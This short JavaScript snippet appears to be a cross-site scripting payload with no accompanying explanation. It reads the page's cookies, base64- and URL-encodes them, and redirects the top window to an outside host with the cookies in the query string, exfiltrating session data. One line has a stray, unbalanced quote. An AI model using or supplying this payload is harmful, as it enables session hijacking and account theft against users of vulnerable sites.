data_cookies = encodeURIComponent(btoa(document.cookie))
data_url = 'https://1nj.nl/?c=' + data_cookies + '
top.document.location = data_url
